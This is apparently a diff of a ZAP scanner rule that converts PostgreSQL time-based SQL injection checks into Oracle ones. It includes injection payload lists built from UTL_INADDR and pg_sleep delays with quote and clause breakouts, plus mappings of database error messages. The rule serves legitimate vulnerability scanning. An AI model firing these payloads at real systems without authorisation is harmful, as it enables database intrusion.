+++ addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionOracleTimingScanRule.java
@@ -19,10 +19,8 @@
  */
 package org.zaproxy.zap.extension.ascanrules;
 
-import java.net.SocketException;
 import java.util.LinkedHashMap;
 import java.util.Map;
-import org.apache.commons.configuration.ConversionException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.parosproxy.paros.Constant;
@@ -31,42 +29,46 @@ import org.parosproxy.paros.core.scanner.Alert;
 import org.parosproxy.paros.core.scanner.Category;
 import org.parosproxy.paros.network.HttpMessage;
 import org.zaproxy.addon.commonlib.CommonAlertTag;
-import org.zaproxy.zap.extension.ruleconfig.RuleConfigParam;
 import org.zaproxy.zap.model.Tech;
 import org.zaproxy.zap.model.TechSet;
 
 /**
- * The SqlInjectionPostgreScanRule identifies Postgresql specific SQL Injection vulnerabilities
- * using Postgresql specific syntax. If it doesn't use Postgresql specific syntax, it belongs in the
- * generic SQLInjection class! Note the ordering of checks, for efficiency is : 1) Error based (N/A)
- * 2) Boolean Based (N/A - uses standard syntax) 3) UNION based (N/A - uses standard syntax) 4)
- * Stacked (N/A - uses standard syntax) 5) Blind/Time Based (Yes)
+ * TODO: maybe implement a more specific UNION based check for Oracle (with table names)
+ *
+ * <p>The SqlInjectionOracleScanRule identifies Oracle specific SQL Injection vulnerabilities using
+ * Oracle specific syntax. If it doesn't use Oracle specific syntax, it belongs in the generic
+ * SQLInjection class! Note the ordering of checks, for efficiency is : 1) Error based (N/A) 2)
+ * Boolean Based (N/A - uses standard syntax) 3) UNION based (TODO) 4) Stacked (N/A - uses standard
+ * syntax) 5) Blind/Time Based (Yes)
  *
  * <p>See the following for some great specific tricks which could be integrated here
  * http://www.websec.ca/kb/sql_injection
- * http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
+ * http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
  *
- * <p>Important Notes for the POSTGRES database (and useful in the code): - takes -- style comments
- * - allows stacked queries via JDBC driver or in PHP??? - Constants in select must be in single
- * quotes, not doubles (like Hypersonic). - supports UDFs (very interesting!!) - 5 (by default)
- * second delay select statement (not taking into account casting, etc.): SELECT pg_sleep(5) -
- * metadata select statement: TODO
+ * <p>Important Notes for the Oracle database (and useful in the code): - takes -- style comments -
+ * requires a table name in normal select statements (like Hypersonic: cannot just say "select 1" or
+ * "select 2" like in most RDBMSs - requires a table name in "union select" statements (like
+ * Hypersonic). - does NOT allow stacked queries via JDBC driver or in PHP. - Constants in select
+ * must be in single quotes, not doubles (like Hypersonic). - supports UDFs (very interesting!!) - 5
+ * second delay select statement: SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT
+ * UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.3')
+ * from dual union SELECT UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT
+ * UTL_INADDR.get_host_name('10.0.0.5') from dual - metadata select statement: TODO
  *
  * @author 70pointer
  */
-public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
+public class SqlInjectionOracleTimingScanRule extends AbstractAppParamPlugin {
 
+    private int expectedDelayInMs = 5000;
+
+    private boolean doUnionBased = false; // TODO: use in Union based, when we implement it
     private boolean doTimeBased = false;
 
+    private int doUnionMaxRequests = 0; // TODO: use in Union based, when we implement it
     private int doTimeMaxRequests = 0;
 
-    private int sleepInSeconds = 15;
-
-    /** Postgresql one-line comment */
+    /** Oracle one-line comment */
     public static final String SQL_ONE_LINE_COMMENT = " -- ";
-
-    private static final String ORIG_VALUE_TOKEN = "<<<<ORIGINALVALUE>>>>";
-    private static final String SLEEP_TOKEN = "<<<<SLEEP>>>>";
 
     /**
      * create a map of SQL related error message fragments, and map them back to the RDBMS that they
@@ -78,102 +80,66 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
     private static final Map<String, String> SQL_ERROR_TO_DBMS = new LinkedHashMap<>();
 
     static {
-        SQL_ERROR_TO_DBMS.put("org.postgresql.util.PSQLException", "PostgreSQL");
-        SQL_ERROR_TO_DBMS.put("org.postgresql", "PostgreSQL");
-        // Note: only Postgresql mappings here.
-        // TODO: is this all?? we need more error messages for Postgresql for different languages.
-        // PHP, ASP, JSP(JDBC), etc.
+        SQL_ERROR_TO_DBMS.put("oracle.jdbc", "Oracle");
+        SQL_ERROR_TO_DBMS.put("SQLSTATE[HY", "Oracle");
+        SQL_ERROR_TO_DBMS.put("ORA-00933", "Oracle");
+        SQL_ERROR_TO_DBMS.put("ORA-06512", "Oracle"); // indicates the line number of an error
+        SQL_ERROR_TO_DBMS.put("SQL command not properly ended", "Oracle");
+        SQL_ERROR_TO_DBMS.put("ORA-00942", "Oracle"); // table or view does not exist
+        SQL_ERROR_TO_DBMS.put("ORA-29257", "Oracle"); // host unknown
+        SQL_ERROR_TO_DBMS.put("ORA-00932", "Oracle"); // inconsistent datatypes
+
+        // Note: only Oracle mappings here.
+        // TODO: is this all?? we need more error messages for Oracle for different languages. PHP
+        // (oci8), ASP, JSP(JDBC), etc
     }
 
-    /**
-     * The sleep function in Postgresql cast it back to an int, so we can use it in nested select
-     * statements and stuff.
-     */
-    private static String SQL_POSTGRES_TIME_FUNCTION =
-            "case when cast(pg_sleep(" + SLEEP_TOKEN + ") as varchar) > '' then 0 else 1 end";
+    /** the 5 second sleep function in Oracle SQL */
+    private static String SQL_ORACLE_TIME_SELECT =
+            "SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual";
 
-    /** Postgres specific time based injection strings. */
+    /** Oracle specific time based injection strings. each for 5 seconds */
 
-    // issue with "+" symbols in here:
-    // we cannot encode them here as %2B, as then the database gets them double encoded as %252B
-    // we cannot leave them as unencoded '+' characters either, as then they are NOT encoded by the
-    // HttpMessage.setGetParams (x) or by AbstractPlugin.sendAndReceive (HttpMessage)
-    // and are seen by the database as spaces :(
-    // in short, we cannot use the "+" character in parameters, unless we mean to use it as a space
-    // character!!!! Particularly Nasty.
-    // Workaround: use RDBMS specific functions like "CONCAT(a,b,c)" which mean parsing the original
-    // value into the middle of the parameter value to be passed,
-    // rather than just appending to it
-    // Issue: this technique does not close the open ' or " in the query.. so do not use it..
     // Note: <<<<ORIGINALVALUE>>>> is replaced with the original parameter value at runtime in these
     // examples below (see * comment)
     // TODO: maybe add support for ')' after the original value, before the sleeps
-
-    private static String[] SQL_POSTGRES_TIME_REPLACEMENTS = {
-        SQL_POSTGRES_TIME_FUNCTION,
-        SQL_POSTGRES_TIME_FUNCTION + SQL_ONE_LINE_COMMENT,
-        "'" + SQL_POSTGRES_TIME_FUNCTION + SQL_ONE_LINE_COMMENT,
-        "\"" + SQL_POSTGRES_TIME_FUNCTION + SQL_ONE_LINE_COMMENT,
-        ORIG_VALUE_TOKEN
-                + " / "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " ", // Try without a comment, to target use of the field in the SELECT clause,
-        // but also in the WHERE clauses.
-        ORIG_VALUE_TOKEN
-                + "' / "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " / '", // Try without a comment, to target use of the field in the SELECT clause,
-        // but also in the WHERE clauses.
-        ORIG_VALUE_TOKEN
-                + "\" / "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " / \"", // Try without a comment, to target use of the field in the SELECT
-        // clause, but also in the WHERE clauses.
-        ORIG_VALUE_TOKEN
-                + " where 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in SELECT/UPDATE/DELETE clause.
-        ORIG_VALUE_TOKEN
-                + "' where 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in SELECT/UPDATE/DELETE clause.
-        ORIG_VALUE_TOKEN
-                + "\" where 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in SELECT/UPDATE/DELETE clause.
-        ORIG_VALUE_TOKEN
-                + " and 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause.
-        ORIG_VALUE_TOKEN
-                + "' and 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause.
-        ORIG_VALUE_TOKEN
-                + "\" and 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause.
-        ORIG_VALUE_TOKEN
-                + " or 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause.
-        ORIG_VALUE_TOKEN
-                + "' or 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause.
-        ORIG_VALUE_TOKEN
-                + "\" or 0 in (select "
-                + SQL_POSTGRES_TIME_FUNCTION
-                + " )"
-                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause.
+    private static String[] SQL_ORACLE_TIME_REPLACEMENTS = {
+        "(" + SQL_ORACLE_TIME_SELECT + ")",
+        "<<<<ORIGINALVALUE>>>> / (" + SQL_ORACLE_TIME_SELECT + ") ",
+        "<<<<ORIGINALVALUE>>>>' / (" + SQL_ORACLE_TIME_SELECT + ") / '",
+        "<<<<ORIGINALVALUE>>>>\" / (" + SQL_ORACLE_TIME_SELECT + ") / \"",
+        "<<<<ORIGINALVALUE>>>> and exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
+        "<<<<ORIGINALVALUE>>>>' and exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
+        "<<<<ORIGINALVALUE>>>>\" and exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
+        "<<<<ORIGINALVALUE>>>>) and exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
+        "<<<<ORIGINALVALUE>>>> or exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
+        "<<<<ORIGINALVALUE>>>>' or exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
+        "<<<<ORIGINALVALUE>>>>\" or exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
+        "<<<<ORIGINALVALUE>>>>) or exists ("
+                + SQL_ORACLE_TIME_SELECT
+                + ")"
+                + SQL_ONE_LINE_COMMENT, // Param in WHERE clause somewhere
     };
 
     private static final Map<String, String> ALERT_TAGS =
@@ -183,21 +149,22 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
                     CommonAlertTag.WSTG_V42_INPV_05_SQLI);
 
     /** for logging. */
-    private static final Logger LOGGER = LogManager.getLogger(SqlInjectionPostgreScanRule.class);
+    private static final Logger LOGGER =
+            LogManager.getLogger(SqlInjectionOracleTimingScanRule.class);
 
     @Override
     public int getId() {
-        return 40022;
+        return 40021;
     }
 
     @Override
     public String getName() {
-        return Constant.messages.getString("ascanrules.sqlinjection.postgres.name");
+        return Constant.messages.getString("ascanrules.sqlinjection.oracle.name");
     }
 
     @Override
     public boolean targets(TechSet technologies) {
-        return technologies.includes(Tech.PostgreSQL);
+        return technologies.includes(Tech.Oracle);
     }
 
     @Override
@@ -228,34 +195,33 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
         if (this.getAttackStrength() == AttackStrength.LOW) {
             doTimeBased = true;
             doTimeMaxRequests = 3;
+            doUnionBased = true;
+            doUnionMaxRequests = 3;
         } else if (this.getAttackStrength() == AttackStrength.MEDIUM) {
             doTimeBased = true;
             doTimeMaxRequests = 5;
+            doUnionBased = true;
+            doUnionMaxRequests = 5;
         } else if (this.getAttackStrength() == AttackStrength.HIGH) {
             doTimeBased = true;
             doTimeMaxRequests = 10;
+            doUnionBased = true;
+            doUnionMaxRequests = 10;
         } else if (this.getAttackStrength() == AttackStrength.INSANE) {
             doTimeBased = true;
             doTimeMaxRequests = 100;
+            doUnionBased = true;
+            doUnionMaxRequests = 100;
         }
-        // Read the sleep value from the configs
-        try {
-            this.sleepInSeconds =
-                    this.getConfig().getInt(RuleConfigParam.RULE_COMMON_SLEEP_TIME, 15);
-        } catch (ConversionException e) {
-            LOGGER.debug(
-                    "Invalid value for 'rules.common.sleep': {}",
-                    this.getConfig().getString(RuleConfigParam.RULE_COMMON_SLEEP_TIME));
-        }
-        LOGGER.debug("Sleep set to {} seconds", sleepInSeconds);
     }
 
     /**
-     * scans for SQL Injection vulnerabilities, using POSTGRES specific syntax. If it doesn't use
-     * specifically POSTGRES syntax, it does not belong in here, but in SQLInjection
+     * scans for SQL Injection vulnerabilities, using Oracle specific syntax. If it doesn't use
+     * specifically Oracle syntax, it does not belong in here, but in SQLInjection
      */
     @Override
     public void scan(HttpMessage originalMessage, String paramName, String paramValue) {
+
         try {
             // Timing Baseline check: we need to get the time that it took the original query, to
             // know if the time based check is working correctly..
@@ -269,40 +235,31 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
                         "The Base Time Check timed out on [{}] URL [{}]",
                         msgTimeBaseline.getRequestHeader().getMethod(),
                         msgTimeBaseline.getRequestHeader().getURI());
-            } catch (SocketException ex) {
-                LOGGER.debug(
-                        "Caught {} {} when accessing: {}",
-                        ex.getClass().getName(),
-                        ex.getMessage(),
-                        msgTimeBaseline.getRequestHeader().getURI());
-                return; // No need to keep going
             }
             long originalTimeUsed = msgTimeBaseline.getTimeElapsedMillis();
             // end of timing baseline check
 
+            int countUnionBasedRequests = 0;
             int countTimeBasedRequests = 0;
 
             LOGGER.debug(
-                    "Scanning URL [{}] [{}], field [{}] with original value [{}] for SQL Injection",
+                    "Scanning URL [{}] [{}], field [{}] with value [{}] for Oracle SQL Injection",
                     getBaseMsg().getRequestHeader().getMethod(),
                     getBaseMsg().getRequestHeader().getURI(),
                     paramName,
                     paramValue);
 
-            // POSTGRES specific time based SQL injection checks
+            // Check for time based SQL Injection, using Oracle specific syntax
             for (int timeBasedSQLindex = 0;
-                    timeBasedSQLindex < SQL_POSTGRES_TIME_REPLACEMENTS.length
+                    timeBasedSQLindex < SQL_ORACLE_TIME_REPLACEMENTS.length
                             && doTimeBased
                             && countTimeBasedRequests < doTimeMaxRequests;
                     timeBasedSQLindex++) {
                 HttpMessage msgAttack = getNewMsg();
                 String newTimeBasedInjectionValue =
-                        SQL_POSTGRES_TIME_REPLACEMENTS[timeBasedSQLindex]
-                                .replace(ORIG_VALUE_TOKEN, paramValue)
-                                .replace(SLEEP_TOKEN, Integer.toString(sleepInSeconds));
-
+                        SQL_ORACLE_TIME_REPLACEMENTS[timeBasedSQLindex].replace(
+                                "<<<<ORIGINALVALUE>>>>", paramValue);
                 setParameter(msgAttack, paramName, newTimeBasedInjectionValue);
-
                 // send it.
                 try {
                     sendAndReceive(msgAttack, false); // do not follow redirects
@@ -315,13 +272,6 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
                             msgTimeBaseline.getRequestHeader().getMethod(),
                             msgTimeBaseline.getRequestHeader().getURI(),
                             paramName);
-                } catch (SocketException ex) {
-                    LOGGER.debug(
-                            "Caught {} {} when accessing: {}",
-                            ex.getClass().getName(),
-                            ex.getMessage(),
-                            msgTimeBaseline.getRequestHeader().getURI());
-                    return; // No need to keep going
                 }
                 long modifiedTimeUsed = msgAttack.getTimeElapsedMillis();
 
@@ -333,9 +283,8 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
                         modifiedTimeUsed,
                         originalTimeUsed);
 
-                if (modifiedTimeUsed >= (originalTimeUsed + (sleepInSeconds * 1000))) {
-                    // takes more than 15 (by default) extra seconds => likely time based SQL
-                    // injection
+                if (modifiedTimeUsed >= (originalTimeUsed + expectedDelayInMs)) {
+                    // takes more than 5 extra seconds => likely time based SQL injection.
 
                     // But first double check
                     HttpMessage msgc = getNewMsg();
@@ -345,7 +294,7 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
                         // Ignore all exceptions
                     }
                     long checkTimeUsed = msgc.getTimeElapsedMillis();
-                    if (checkTimeUsed >= (originalTimeUsed + (this.sleepInSeconds * 1000) - 200)) {
+                    if (checkTimeUsed >= (originalTimeUsed + this.expectedDelayInMs - 200)) {
                         // Looks like the server is overloaded, very unlikely this is a real issue
                         continue;
                     }
@@ -365,8 +314,8 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
 
                     newAlert()
                             .setConfidence(Alert.CONFIDENCE_MEDIUM)
-                            .setName(getName() + " - Time Based")
                             .setUri(getBaseMsg().getRequestHeader().getURI().toString())
+                            .setName(getName() + " - Time Based")
                             .setParam(paramName)
                             .setAttack(attack)
                             .setOtherInfo(extraInfo)
@@ -387,13 +336,12 @@ public class SqlInjectionPostgreScanRule extends AbstractAppParamPlugin {
             // Do not try to internationalise this.. we need an error message in any event..
             // if it's in English, it's still better than not having it at all.
             LOGGER.error(
-                    "An error occurred checking a url for POSTGRES SQL Injection vulnerabilities",
-                    e);
+                    "An error occurred checking a url for Oracle SQL Injection vulnerabilities", e);
         }
     }
 
-    public void setSleepInSeconds(int sleep) {
-        this.sleepInSeconds = sleep;
+    public void setExpectedDelayInMs(int delay) {
+        expectedDelayInMs = delay;
     }
 
     @Override
